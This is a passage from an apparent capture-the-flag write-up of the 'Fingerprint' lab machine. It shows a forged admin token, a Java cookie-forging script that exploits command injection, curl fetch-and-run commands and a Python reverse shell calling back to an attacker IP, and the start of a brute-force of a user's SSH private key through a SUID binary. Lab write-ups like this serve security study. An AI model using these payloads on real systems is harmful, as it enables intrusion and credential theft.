<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoick8wQUJYTnlBQ0ZqYjIwdVlXUnRhVzR1YzJWamRYSnBkSGt1YzNKakxtMXZaR1ZzTGxWelpYS1VCTmR6NDErNWF3SUFCRWtBQW1sa1RBQUxabWx1WjJWeWNISnBiblIwQUJKTWFtRjJZUzlzWVc1bkwxTjBjbWx1Wnp0TUFBaHdZWE56ZDI5eVpIRUFmZ0FCVEFBSWRYTmxjbTVoYldWeEFINEFBWGh3QUFBQUFuUUFRRGRsWmpVeVl6STFNV1k0TURRMFkySXhPRGN3TVRNNU9USTRPVEZrTUdVMU9HTmxPVEU1TkdSbE4yWTFNelZpTVdJMFptRTJZbUptWlRBNE5qYzRaalowQUJSTVYyYzNaMVZTTVVWdFdEZFZUbmh6U25oeFduUUFCV0ZrYldsdSJ9.lPDqZy7OX9cBclkxmK9gAx4SWiad_YFrjezvJO1apCA</span><br></pre></td></tr></table></figure>

<p>We can now replace our current cookie with the newly forged cookie to access the <code>admin</code> account. </p>
<p><img src="https://user-images.githubusercontent.com/9076747/163730383-9cd288ba-5d3a-4057-a79c-a573d8a707bc.png" alt="https://user-images.githubusercontent.com/9076747/163730383-9cd288ba-5d3a-4057-a79c-a573d8a707bc.png"></p>
<p>As <code>admin</code> the only additional function we seem to get is access to a “Recent Logs” display. At first sight it looks like this admin cookie doesn’t give us access to anything valuable. </p>
<h3 id="Command-Injection-to-Remote-Code-Execution"><a href="#Command-Injection-to-Remote-Code-Execution" class="headerlink" title="Command Injection to Remote Code Execution"></a>Command Injection to Remote Code Execution</h3><p>Once again let’s go back and check what we might have missed.<br>One thing I overlooked is the import of <a target="_blank" rel="noopener" href="http://fingerprint.htb:8080/backups/UserProfileStorage.java"><code>UserProfileStorage.java</code></a> in the <code>[Profile.java](http://Profile.java)</code> file. The file is also accessible on the <code>/backups/</code> folder, let’s take a look:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://fingerprint.htb:8080/backups/UserProfileStorage.java</span></span><br><span class="line"><span class="keyword">package</span> com.admin.security.src.profile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.admin.security.src.model.Profile;</span><br><span class="line"><span class="keyword">import</span> com.admin.security.src.model.User;</span><br><span class="line"><span class="keyword">import</span> com.admin.security.src.utils.SerUtils;</span><br><span class="line"><span class="keyword">import</span> com.admin.security.src.utils.Terminal;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.admin.security.src.profile.Settings.AUTH_LOG;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserProfileStorage</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5667788713462095525L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> User user;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(<span class="keyword">final</span> ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        inputStream.defaultReadObject();</span><br><span class="line">        readProfile();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Profile <span class="title">readProfile</span><span class="params">()</span> <span class="keyword">throws</span> IllegalStateException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> File profileFile = user.getProfileLocation();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> Path path = Paths.get(profileFile.getAbsolutePath());</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">byte</span>[] content = Files.readAllBytes(path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> Profile profile = (Profile) SerUtils.from(content);</span><br><span class="line">            <span class="keyword">if</span> (profile.isAdminProfile()) &#123; <span class="comment">// load authentication logs only for super user</span></span><br><span class="line">                profile.getLogs().clear();</span><br><span class="line">                <span class="keyword">final</span> String cmd = <span class="string">&quot;cat &quot;</span> + AUTH_LOG.getAbsolutePath() + <span class="string">&quot; | grep &quot;</span> + user.getUsername();</span><br><span class="line">                profile.getLogs().addAll(Arrays.asList(Terminal.run(cmd).split(<span class="string">&quot;\n&quot;</span>)));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> profile;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Error fetching profile&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The following part is very interesting:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (profile.isAdminProfile()) &#123; <span class="comment">// load authentication logs only for super user</span></span><br><span class="line">    profile.getLogs().clear();</span><br><span class="line">    <span class="keyword">final</span> String cmd = <span class="string">&quot;cat &quot;</span> + AUTH_LOG.getAbsolutePath() + <span class="string">&quot; | grep &quot;</span> + user.getUsername();</span><br><span class="line">    profile.getLogs().addAll(Arrays.asList(Terminal.run(cmd).split(<span class="string">&quot;\n&quot;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We can quickly identify a Command Injection vulnerability from the <code>username</code> field.</p>
<p>Let’s break it down to see how it can be exploited.</p>
<ol>
<li>We understand the <code>admin</code> profile file is being stored in <code>/data/sessions/admin.ser</code></li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// User.java:39</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> File <span class="title">getProfileLocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> File dir = <span class="keyword">new</span> File(<span class="string">&quot;/data/sessions/&quot;</span>);</span><br><span class="line">    dir.mkdirs();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> String pathname = dir.getAbsolutePath() + <span class="string">&quot;/&quot;</span> + username + <span class="string">&quot;.ser&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> Paths.get(pathname).normalize().toFile();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>The application read the profile file to retrieve session information on the currently connected user.</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Profile.java:38</span></span><br><span class="line">profile = <span class="keyword">new</span> UserProfileStorage(user).readProfile();</span><br></pre></td></tr></table></figure>

<ol>
<li>If the connected user is <code>admin</code> then the application uses <code>grep</code> and return the logs containing the string “admin”:</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Path path = Paths.get(profileFile.getAbsolutePath());</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">byte</span>[] content = Files.readAllBytes(path);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Profile profile = (Profile) SerUtils.from(content);</span><br><span class="line"><span class="keyword">if</span> (profile.isAdminProfile()) &#123; <span class="comment">// load authentication logs only for super user</span></span><br><span class="line">    profile.getLogs().clear();</span><br><span class="line">     <span class="keyword">final</span> String cmd = <span class="string">&quot;cat &quot;</span> + AUTH_LOG.getAbsolutePath() + <span class="string">&quot; | grep &quot;</span> + user.getUsername();</span><br><span class="line">     profile.getLogs().addAll(Arrays.asList(Terminal.run(cmd).split(<span class="string">&quot;\n&quot;</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> profile;</span><br></pre></td></tr></table></figure>

<p>Since we can control the username field through our cookie forging, we can very probably exploit the command injection vulnerability on <code>grep &quot; + user.getUsername();</code>.<br>For example if we set our username to <code>admin; id</code> the following will be run by the application:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// <span class="string">&quot;cat &quot;</span> + AUTH_LOG.getAbsolutePath() + <span class="string">&quot; | grep &quot;</span> + user.getUsername();</span><br><span class="line">$ cat /data/sessions/admin.ser | grep admin; id</span><br></pre></td></tr></table></figure>

<p>Let’s create a new script to forge the malicious cookie:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com/admin/security/src/model/RCE.java</span></span><br><span class="line"><span class="keyword">package</span> com.admin.security.src.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RCE</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        <span class="keyword">final</span> String cmd = args[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        user.setUsername(<span class="string">&quot;$(&quot;</span> + cmd + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        user.setFingerPrint(<span class="string">&quot;x&quot;</span>); <span class="comment">// setting id and password are not needed</span></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(user);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        String cookie = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Injected command:\n&quot;</span> + cmd);</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Cookie:\n&quot;</span> + cookie);</span><br><span class="line"></span><br><span class="line">        System.out.println(getProfileLocation());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Let’s build it and grab our cookie:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ javac com/admin/security/src/model/RCE.java</span><br><span class="line">[hg8@archbook ~]$ java com.admin.security.src.model.RCE <span class="string">&quot;curl http://10.10.14.80:8000&quot;</span></span><br><span class="line">[+] Injected <span class="built_in">command</span>:</span><br><span class="line">curl http://10.10.14.80:8000</span><br><span class="line">[+] Cookie:</span><br><span class="line">rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAHQAAXh0AAB0AB8kKGN1cmwgaHR0cDovLzEwLjEwLjE0LjgwOjgwMDAp</span><br></pre></td></tr></table></figure>

<p>And the application crash when setting this cookie… </p>
<p>The problem most likely comes from this line:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// User.java:43</span></span><br><span class="line"><span class="keyword">final</span> String pathname = dir.getAbsolutePath() + <span class="string">&quot;/&quot;</span> + username + <span class="string">&quot;.ser&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>The application cannot find the correct <code>admin.ser</code> path since our <code>username</code> variable is <code>$(curl http://10.10.14.80:8000)</code>. To bypass this issue we can take advantage of the <code>normalize()</code> being applied to the path on the following line.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// User.java:44</span></span><br><span class="line"><span class="keyword">return</span> Paths.get(pathname).normalize().toFile();</span><br></pre></td></tr></table></figure>

<blockquote>
<p>The normalize() method of java.nio.file.Path used to return a path from current path in which all redundant name elements are eliminated.<br>The precise definition of this method is implementation dependent and it derives a path that does not contain redundant name elements. In many file systems, the “.” and “..” are special names indicating the current directory and parent directory. In those cases all occurrences of “.” are considered redundant and If a “..” is preceded by a non-“..” name then both names are considered redundant.</p>
</blockquote>
<p>After a few tries we can find the correct payload that will be normalized as <code>/data/sessions/admin.ser</code> but still achieve Command Injection when stored in the <code>username</code> field. We can write this little POC based on the <code>[User.java](http://User.java)</code> source code to make sure the payload is valid:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> File <span class="title">getProfileLocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> File dir = <span class="keyword">new</span> File(<span class="string">&quot;/data/sessions/&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> String pathname = dir.getAbsolutePath() + <span class="string">&quot;/&quot;</span> + <span class="string">&quot;$(curl http://10.10.14.80:8000)/../../admin&quot;</span> + <span class="string">&quot;.ser&quot;</span>;</span><br><span class="line">    System.out.println(<span class="string">&quot;Original Path: &quot;</span> + pathname);</span><br><span class="line">    System.out.println(<span class="string">&quot;Normalized Path: &quot;</span> + Paths.get(pathname).normalize());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Output</span></span><br><span class="line"><span class="comment">// Received Path: /data/sessions/$(curl http://10.10.14.80:8000)/../../admin.ser</span></span><br><span class="line"><span class="comment">// Normalized Path: /data/sessions/admin.ser</span></span><br></pre></td></tr></table></figure>

<p>Let’s update our script with the correct payload:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.admin.security.src.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RCE</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        <span class="keyword">final</span> String cmd = args[<span class="number">0</span>];</span><br><span class="line">					</span><br><span class="line">        user.setUsername(<span class="string">&quot;$(&quot;</span> + cmd + <span class="string">&quot;)/../../admin&quot;</span>);</span><br><span class="line">        user.setFingerPrint(<span class="string">&quot;x&quot;</span>); <span class="comment">// setting id and password are not needed</span></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(user);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        String cookie = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Injected command:\n&quot;</span> + cmd);</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Cookie:\n&quot;</span> + cookie);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Generate the cookie and open a Python listener:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ javac com/admin/security/src/model/RCE.java</span><br><span class="line">$ java com.admin.security.src.model.RCE <span class="string">&quot;curl http://10.10.14.80:8000&quot;</span></span><br><span class="line">[+] Injected <span class="built_in">command</span>:</span><br><span class="line">curl http://10.10.14.80:8000</span><br><span class="line">[+] Cookie:</span><br><span class="line">rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAHQAAXh0AAB0ACskKGN1cmwgaHR0cDovLzEwLjEwLjE0LjgwOjgwMDApLy4uLy4uL2FkbWlu</span><br><span class="line">$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure>

<p>And Bingo! Once we set up our new cookie we get a callback.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.129.119.65 - - [18/Apr/2022 11:05:19] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>Using the same methodology we can upload a reverse shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat hg8.py</span><br><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.10.14.80&quot;</span>,8585));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)RCE</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ java com.admin.security.src.model.RCE <span class="string">&quot;curl http://10.10.14.80:8000/hg8.py -o /tmp/hg8.py&quot;</span></span><br><span class="line">[+] Injected payload:</span><br><span class="line">$(curl http://10.10.14.80:8000/hg8.py -o /tmp/hg8.py)/../../../../../admin</span><br><span class="line">[+] Cookie:</span><br><span class="line">rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAHQAAXh0AAB0AEokKGN1cmwgaHR0cDovLzEwLjEwLjE0LjgwOjgwMDAvaGc4LnB5IC1vIC90bXAvaGc4LnB5KS8uLi8uLi8uLi8uLi8uLi9hZG1pbg==</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ java com.admin.security.src.model.RCE <span class="string">&quot;python /tmp/hg8.py&quot;</span></span><br><span class="line">[+] Injected payload:</span><br><span class="line">$(python /tmp/hg8.py)/../../../admin</span><br><span class="line">[+] Cookie:</span><br><span class="line">rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAHQAAXh0AAB0ACQkKHB5dGhvbiAvdG1wL2hnOC5weSkvLi4vLi4vLi4vYWRtaW4=</span><br></pre></td></tr></table></figure>

<p>After setting the cookie we get our shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on 0.0.0.0 8585</span><br><span class="line">Connection received on fingerprint.htb 48072</span><br><span class="line">www-data@fingerprint:/opt/glassfish5/glassfish/domains/domain1/config$</span><br></pre></td></tr></table></figure>

<h3 id="Pivot-www-data-→john"><a href="#Pivot-www-data-→john" class="headerlink" title="Pivot www-data →john"></a>Pivot www-data →john</h3><p>After a lot of enumeration as <code>www-data</code> on the box, the only thing that catches my eye is a SUID binary belonging to <code>john</code> called <code>cmatch</code>.<br>Sounds like the perfect way to pivot to <code>john</code> user.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@fingerprint:/$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">[...]</span><br><span class="line">/usr/bin/cmatch</span><br><span class="line">www-data@fingerprint:/$ ls -la /usr/bin/cmatch</span><br><span class="line">-rwsr-sr-x 1 john john 2261627 Sep 26  2021 /usr/bin/cmatch</span><br></pre></td></tr></table></figure>

<p>It’s the first time I see this binary and I can’t seem to find information about it online. After a few trial and error we can understand it’s some kind of <code>grep</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">www-data@fingerprint:/tmp$ cmatch</span><br><span class="line">Incorrect number of arguments!</span><br><span class="line">www-data@fingerprint:/tmp$ cmatch a</span><br><span class="line">Incorrect number of arguments!</span><br><span class="line">www-data@fingerprint:/tmp$ cmatch a b</span><br><span class="line">open a: no such file or directory</span><br><span class="line">www-data@fingerprint:/tmp$ <span class="built_in">echo</span> hg8 &gt; <span class="built_in">test</span></span><br><span class="line">www-data@fingerprint:/tmp$ cmatch /tmp/<span class="built_in">test</span> h</span><br><span class="line">Found matches: 1</span><br><span class="line">www-data@fingerprint:/tmp$ cmatch /tmp/<span class="built_in">test</span> hg</span><br><span class="line">Found matches: 1</span><br><span class="line">www-data@fingerprint:/tmp$ cmatch /tmp/<span class="built_in">test</span> hgd</span><br><span class="line">Found matches: 0</span><br><span class="line">www-data@fingerprint:/tmp$ cmatch /tmp/<span class="built_in">test</span> hg8</span><br><span class="line">Found matches: 1</span><br></pre></td></tr></table></figure>

<p>Since <code>cmatch</code> is running as <code>john</code>, we can very probably brute-force the SSH key <code>id_rsa</code> belonging to the user <code>john</code>. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa <span class="string">&quot;-----BEGIN RSA PRIVATE KEY-----&quot;</span></span><br><span class="line">Found matches: 1</span><br></pre></td></tr></table></figure>

<p>We can write a simple script to do this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">chars = <span class="built_in">list</span>(string.ascii_letters + string.digits)</span><br><span class="line">chars.extend([<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot; &quot;</span>,<span class="string">&quot;\+&quot;</span>]) <span class="comment"># add special chars commonly found in SSH keys</span></span><br><span class="line"></span><br><span class="line">final_key = <span class="string">&quot;-----BEGIN RSA PRIVATE KEY-----&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bruteforce</span>():</span></span><br><span 